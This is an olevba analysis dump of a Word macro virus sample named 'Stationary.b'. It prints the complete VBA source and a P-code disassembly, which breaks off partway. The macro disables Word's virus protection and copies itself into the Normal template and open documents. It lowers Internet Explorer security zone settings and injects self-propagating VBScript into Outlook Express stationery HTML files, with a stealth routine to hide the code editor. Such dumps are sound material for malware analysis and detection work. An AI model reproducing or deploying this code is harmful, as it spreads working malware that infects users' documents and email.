olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Stationary.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Stationary.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Stationery
'v1.2, Residency :)
'by CyberShadow//SMF
Private Sub Document_Close()
 With Application
  .EnableCancelKey = False
  .ScreenUpdating = False
  .ShowVisualBasicEditor = False
 End With
 With Options
  .ConfirmConversions = False
  .SaveNormalPrompt = False
  .VirusProtection = False
 End With
 Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 If NT.Lines(1, 1) <> "'Stationery" Then
  NT.DeleteLines 1, NT.CountOfLines
  NT.InsertLines 1, AD.Lines(1, AD.CountOfLines)
 End If
 If AD.Lines(1, 1) <> "'Stationery" Then
  AD.DeleteLines 1, AD.CountOfLines
  AD.InsertLines 1, NT.Lines(1, NT.CountOfLines)
 End If
 CrStr = getname()
 Call compile(CryptedString, CrStr)
 Call CorrectLine(CryptedString, CrStr)
 a = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery", "Stationery Folder") + "\"
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201") = ""
 System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0", "1201") = ""
 Call infectHTML(a, CryptedString, CrStr)
End Sub
Private Sub infectHTML(a, CryptedString, CrStr)
 With Application.FileSearch
  .FileName = "*.htm"
  .MatchAllWordForms = True
  .LookIn = a
  .SearchSubFolders = True
  .Execute
  For i = 1 To .FoundFiles.Count
   c = .FoundFiles(i)
   Open c For Input As 1
    If LOF(1) > 55000 Then GoTo ExitRead
    e = ""
    Do While Not EOF(1)
     Line Input #1, a2
     d = a2
     If Len(d) >= 3 Then
      b = UCase(d)
      If b = "<HTML> <CYBERSHADOW...>" Then GoTo ExitRead
      If b = "<HTML>" Then b = "<html> <CyberShadow...>": d = b
      For j = 1 To Len(b) - 6
       If Mid$(b, j, 8) = "</BODY>" Then
        d = Left$(b, j + 7) + Chr$(13) + Chr$(10)
        d = d + "<body>" + Chr$(13) + Chr$(10)
        d = d + "<script language=""VBScript"">" + Chr$(13) + Chr$(10)
        d = d + "<!--" + Chr$(13) + Chr$(10)
        d = d + "On Error Resume Next" + Chr$(13) + Chr$(10)
        d = d + CryptedString + Chr$(13) + Chr$(10)
        d = d + "Dim FSO" + Chr$(13) + Chr$(10)
        d = d + "Set FSO = CreateObject(""Scripting.FileSystemObject"")" + Chr$(13) + Chr$(10)
        d = d + "Set WordObj = GetObject("""", ""Word.Application""): Quit = 0" + Chr$(13) + Chr$(10)
        d = d + "If WordObj = """" Then" + Chr$(13) + Chr$(10)
        d = d + "Set WordObj = CreateObject(""Word.Application""): Quit = 1" + Chr$(13) + Chr$(10)
        d = d + "End If" + Chr$(13) + Chr$(10)
        d = d + "Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule" + Chr$(13) + Chr$(10)
        d = d + "If NT.Lines(1, 1) <> ""'Stationery"" Then" + Chr$(13) + Chr$(10)
        d = d + "WordObj.Options.SaveNormalPrompt = False" + Chr$(13) + Chr$(10)
        d = d + "NT.DeleteLines 1, NT.CountOfLines" + Chr$(13) + Chr$(10)
        d = d + "NT.InsertLines 1," + CrStr + Chr$(13) + Chr$(10)
        d = d + "End If" + Chr$(13) + Chr$(10)
        d = d + "Set NT = Nothing" + Chr$(13) + Chr$(10)
        d = d + "If Quit = 1 Then WordObj.Quit" + Chr$(13) + Chr$(10)
        d = d + "--></script>" + Chr$(13) + Chr$(10)
        d = d + "</body>" + Chr$(13) + Chr$(10)
        j = j + 7
        If (Len(b) - j - 7) > 0 Then d = d + Right$(b, Len(b) - j - 7)
       End If
      Next
     End If
     e = e + d + Chr$(13) + Chr$(10)
    Loop
    Close #1
    Open c For Output As 1
     Print #1, e
     identities = System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities", "Default User ID")
     System.PrivateProfileString("", "HKEY_CURRENT_USER\Identities\" + identities + "\Software\Microsoft\Outlook Express\5.0\Mail", "Stationery Name") = c
ExitRead:
   Close #1
  Next i
 End With
End Sub
Private Sub CorrectLine(CryptedString, CrStr)
 maxlen = Int(Rnd * 100) + 100
 c = "": l = 0: f2 = -1
 For i = 1 To Len(CryptedString)
  b = Mid$(CryptedString, i, 1)
  If b = """" Then f2 = -f2
  If l > maxlen And f2 = 1 Then
   c = c + """"
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr + "+""": l = Len(c)
  End If
  If b = "+" And l >= maxlen Then
   CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
   maxlen = Int(Rnd * 100) + 100
   c = CrStr + "=" + CrStr: l = Len(c)
  End If
  c = c + b: l = l + 1
 Next
 CryptedS = CryptedS + c + Chr$(13) + Chr$(10)
 CryptedString = CryptedS
End Sub
Private Function getname()
 c = ""
 For i = 1 To Int(Rnd * 7) + 1
  b = Int(Rnd * 26) + 65
  If Rnd > 0.5 Then b = b + 32
  c = c + Chr$(b)
 Next
 c = c + Chr$(Asc("0") + Int(Rnd * 9))
 getname = c
End Function
Private Sub compile(CryptedString, CrStr)
 Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
 a = AD.Lines(1, AD.CountOfLines)
 CryptedString = CrStr + "="
 fl = 0
 For i = 1 To Len(a)
  b = Asc(Mid$(a, i, 1))
  If (b < 33) Or b = Asc("""") Or b = Asc("+") Or b = Asc("_") Or b = Asc("^") Or b = Asc(">") Or b = Asc("<") Then
    If fl = 1 Then CryptedString = CryptedString + """"
    CryptedString = CryptedString + "+chr(" + Str$(b) + ") ": fl = 0
   Else
    If fl = 0 Then
     If Mid$(CryptedString, Len(CryptedString) - 1, 1) = ")" Then CryptedString = CryptedString + "+"
     CryptedString = CryptedString + """"
    End If
    CryptedString = CryptedString + Chr$(b): fl = 1
  End If
 Next
 If Mid$(CryptedString, Len(CryptedString) - 1, 1) <> " " And Mid$(CryptedString, Len(CryptedString) - 1, 1) <> ")" Then CryptedString = CryptedString + """"
End Sub
Private Sub ViewVBCode(): Stealth: End Sub
Private Sub ToolsMacro(): Stealth: End Sub
Private Sub FileTemplates(): Stealth: End Sub
Private Sub Stealth()
On Error Resume Next
Application.ShowVisualBasicEditor = 0
Application.EnableCancelKey = 0
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Stationary.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15579 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000A "Stationery"
' Line #1:
' 	QuoteRem 0x0000 0x0012 "v1.2, Residency :)"
' Line #2:
' 	QuoteRem 0x0000 0x0013 "by CyberShadow//SMF"
' Line #3:
' 	FuncDefn (Private Sub Document_Close())
' Line #4:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #5:
' 	LitVarSpecial (False)
' 	MemStWith EnableCancelKey 
' Line #6:
' 	LitVarSpecial (False)
' 	MemStWith ScreenUpdating 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith ShowVisualBasicEditor 
' Line #8:
' 	EndWith 
' Line #9:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #13:
' 	EndWith 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #16:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000B "'Stationery"
' 	Ne 
' 	IfBlock 
' Line #17:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x000B "'Stationery"
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #22:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	Ld AD 
' 	ArgsMemCall InsertLines 0x0002 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	ArgsLd getname 0x0000 
' 	St CrStr 
' Line #25:
' 	Ld CryptedString 
' 	Ld CrStr 
' 	ArgsCall (Call) compile 0x0002 
' Line #26:
' 	Ld CryptedString 
' 	Ld CrStr 
' 	ArgsCall (Call) CorrectLine 0x0002 
' Line #27:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_LOCAL_MACHINE\Software\Microsoft\Shared Tools\Stationery"
' 	LitStr 0x0011 "Stationery Folder"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0001 "\"
' 	Add 
' 	St a 
' Line #28:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0055 "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x0004 "1201"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #29:
' 	LitStr 0x0000 ""
' 	LitStr 0x0000 ""
' 	LitStr 0x0056 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0"
' 	LitStr 0x0004 "1201"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #30:
' 	Ld a 
' 	Ld CryptedString 
' 	Ld CrStr 
' 	ArgsCall (Call) infectHTML 0x0003 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Private Sub infectHTML(a, CryptedString, CrStr))
' Line #33:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #34:
' 	LitStr 0x0005 "*.htm"
' 	MemStWith FileName 
' Line #35:
' 	LitVarSpecial (True)
' 	MemStWith MatchAllWordForms 
' Line #36:
' 	Ld a 
' 	MemStWith LookIn 
' Line #37:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #38:
' 	ArgsMemCallWith Execute 0x0000 
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	For 
' Line #40:
' 	Ld i 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St c 
' Line #41:
' 	Ld c 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Input)
' Line #42:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI4 0xD6D8 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo ExitRead 
' 	EndIf 
' Line #43:
' 	LitStr 0x0000 ""
' 	St e 
' Line #44:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #45:
' 	LitDI2 0x0001 
' 	Ld a2 
' 	LineInput 
' Line #46:
' 	Ld a2 
' 	St d 
' Line #47:
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0003 
' 	Ge 
' 	IfBlock 
' Line #48:
' 	Ld d 
' 	ArgsLd UCase 0x0001 
' 	St B 
' Line #49:
' 	Ld B 
' 	LitStr 0x0017 "<HTML> <CYBERSHADOW...>"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo ExitRead 
' 	EndIf 
' Line #50:
' 	Ld B 
' 	LitStr 0x0006 "<HTML>"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0017 "<html> <CyberShadow...>"
' 	St B 
' 	BoS 0x0000 
' 	Ld B 
' 	St d 
' 	EndIf 
' Line #51:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld B 
' 	FnLen 
' 	LitDI2 0x0006 
' 	Sub 
' 	For 
' Line #52:
' 	Ld B 
' 	Ld j 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0007 "</BODY>"
' 	Eq 
' 	IfBlock 
' Line #53:
' 	Ld B 
' 	Ld j 
' 	LitDI2 0x0007 
' 	Add 
' 	ArgsLd LBound$ 0x0002 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #54:
' 	Ld d 
' 	LitStr 0x0006 "<body>"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #55:
' 	Ld d 
' 	LitStr 0x001C "<script language="VBScript">"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #56:
' 	Ld d 
' 	LitStr 0x0004 "<!--"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #57:
' 	Ld d 
' 	LitStr 0x0014 "On Error Resume Next"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #58:
' 	Ld d 
' 	Ld CryptedString 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #59:
' 	Ld d 
' 	LitStr 0x0007 "Dim FSO"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #60:
' 	Ld d 
' 	LitStr 0x0034 "Set FSO = CreateObject("Scripting.FileSystemObject")"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #61:
' 	Ld d 
' 	LitStr 0x0039 "Set WordObj = GetObject("", "Word.Application"): Quit = 0"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #62:
' 	Ld d 
' 	LitStr 0x0014 "If WordObj = "" Then"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #63:
' 	Ld d 
' 	LitStr 0x0038 "Set WordObj = CreateObject("Word.Application"): Quit = 1"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #64:
' 	Ld d 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #65:
' 	Ld d 
' 	LitStr 0x0042 "Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #66:
' 	Ld d 
' 	LitStr 0x0027 "If NT.Lines(1, 1) <> "'Stationery" Then"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #67:
' 	Ld d 
' 	LitStr 0x0028 "WordObj.Options.SaveNormalPrompt = False"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #68:
' 	Ld d 
' 	LitStr 0x0021 "NT.DeleteLines 1, NT.CountOfLines"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #69:
' 	Ld d 
' 	LitStr 0x0011 "NT.InsertLines 1,"
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #70:
' 	Ld d 
' 	LitStr 0x0006 "End If"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #71:
' 	Ld d 
' 	LitStr 0x0010 "Set NT = Nothing"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #72:
' 	Ld d 
' 	LitStr 0x001D "If Quit = 1 Then WordObj.Quit"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #73:
' 	Ld d 
' 	LitStr 0x000C "--></script>"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #74:
' 	Ld d 
' 	LitStr 0x0007 "</body>"
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St d 
' Line #75:
' 	Ld j 
' 	LitDI2 0x0007 
' 	Add 
' 	St j 
' Line #76:
' 	Ld B 
' 	FnLen 
' 	Ld j 
' 	Sub 
' 	LitDI2 0x0007 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld d 
' 	Ld B 
' 	Ld B 
' 	FnLen 
' 	Ld j 
' 	Sub 
' 	LitDI2 0x0007 
' 	Sub 
' 	ArgsLd Right$ 0x0002 
' 	Add 
' 	St d 
' 	EndIf 
' Line #77:
' 	EndIfBlock 
' Line #78:
' 	StartForVariable 
' 	Next 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	Ld e 
' 	Ld d 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St e 
' Line #81:
' 	Loop 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #83:
' 	Ld c 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld e 
' 	PrintItemNL 
' Line #85:
' 	LitStr 0x0000 ""
' 	LitStr 0x001C "HKEY_CURRENT_USER\Identities"
' 	LitStr 0x000F "Default User ID"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St identities 
' Line #86:
' 	Ld c 
' 	LitStr 0x0000 ""
' 	LitStr 0x001D "HKEY_CURRENT_USER\Identities\"
' 	Ld identities 
' 	Add 
' 	LitStr 0x002C "\Software\Microsoft\Outlook Express\5.0\Mail"
' 	Add 
' 	LitStr 0x000F "Stationery Name"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #87:
' 	Label ExitRead 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #89:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #90:
' 	EndWith 
' Line #91:
' 	EndSub 
' Line #92:
' 	FuncDefn (Private Sub CorrectLine(CryptedString, CrStr))
' Line #93:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0064 
' 	Add 
' 	St maxlen 
' Line #94:
' 	LitStr 0x0000 ""
' 	St c 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St l 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	UMi 
' 	St f2 
' Line #95:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CryptedString 
' 	FnLen 
' 	For 
' Line #96:
' 	Ld CryptedString 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St B 
' Line #97:
' 	Ld B 
' 	LitStr 0x0001 """
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld f2 
' 	UMi 
' 	St f2 
' 	EndIf 
' Line #98:
' 	Ld l 
' 	Ld maxlen 
' 	Gt 
' 	Ld f2 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #99:
' 	Ld c 
' 	LitStr 0x0001 """
' 	Add 
' 	St c 
' Line #100:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedS 
' Line #101:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0064 
' 	Add 
' 	St maxlen 
' Line #102:
' 	Ld CrStr 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	LitStr 0x0002 "+""
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	Ld c 
' 	FnLen 
' 	St l 
' Line #103:
' 	EndIfBlock 
' Line #104:
' 	Ld B 
' 	LitStr 0x0001 "+"
' 	Eq 
' 	Ld l 
' 	Ld maxlen 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #105:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedS 
' Line #106:
' 	Ld Rnd 
' 	LitDI2 0x0064 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0064 
' 	Add 
' 	St maxlen 
' Line #107:
' 	Ld CrStr 
' 	LitStr 0x0001 "="
' 	Add 
' 	Ld CrStr 
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	Ld c 
' 	FnLen 
' 	St l 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	Ld c 
' 	Ld B 
' 	Add 
' 	St c 
' 	BoS 0x0000 
' 	Ld l 
' 	LitDI2 0x0001 
' 	Add 
' 	St l 
' Line #110:
' 	StartForVariable 
' 	Next 
' Line #111:
' 	Ld CryptedS 
' 	Ld c 
' 	Add 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St CryptedS 
' Line #112:
' 	Ld CryptedS 
' 	St CryptedString 
' Line #113:
' 	EndSub 
' Line #114:
' 	FuncDefn (Private Function getname(id_FFFE As Variant))
' Line #115:
' 	LitStr 0x0000 ""
' 	St c 
' Line #116:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0007 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #117:
' 	Ld Rnd 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	St B 
' Line #118:
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld B 
' 	LitDI2 0x0020 
' 	Add 
' 	St B 
' 	EndIf 
' Line #119:
' 	Ld c 
' 	Ld B 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #120:
' 	StartForVariable 
' 	Next 
' Line #121:
' 	Ld c 
' 	LitStr 0x0001 "0"
' 	ArgsLd Asc 0x0001 
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St c 
' Line #122:
' 	Ld c 
' 	St getname 
' Line #123:
' 	EndFunc 
' Line #124:
' 	FuncDefn (Private Sub compile(CryptedString, CrStr))
' Line #125:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set AD 
' Line #126:
' 	LitDI2 0x0001 
' 	Ld AD 
' 	MemLd CountOfLines 
' 	Ld AD 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #127:
' 	Ld CrStr 
' 	LitStr 0x0001 "="
' 	Add 
' 	St CryptedString 
' Line #128:
' 	LitDI2 0x0000 
' 	St fl 
' Line #129:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a 
' 	FnLen 
' 	For 
' Line #130:
' 	Ld a 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	St B 
' Line #131:
' 	Ld B 
' 	LitDI2 0x0021 
' 	Lt 
' 	Paren 
' 	Ld B 
' 	LitStr 0x0001 """
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "+"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "_"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "^"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 ">"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	Ld B 
' 	LitStr 0x0001 "<"
' 	ArgsLd Asc 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #132:
' 	Ld fl 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CryptedString 
' 	LitStr 0x0001 """
' 	Add 
' 	St CryptedString 
' 	EndIf 
' Line #133:
' 	Ld CryptedString 
' 	LitStr 0x0005 "+chr("
' 	Add 
' 	Ld B 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	LitStr 0x0002 ") "
' 	Add 
' 	St CryptedString 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St fl 
' Line #134:
' 	ElseBlock 
' Line #135:
' 	Ld fl 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #136:
' 	Ld CryptedString 
' 	Ld CryptedString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	LitStr 0x0001 ")"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CryptedString 
' 	LitStr 0x0001 "+"
' 	Add 
' 	St CryptedString 
' 	EndIf 
' Line #137:
' 	Ld CryptedString 
' 	LitStr 0x0001 """
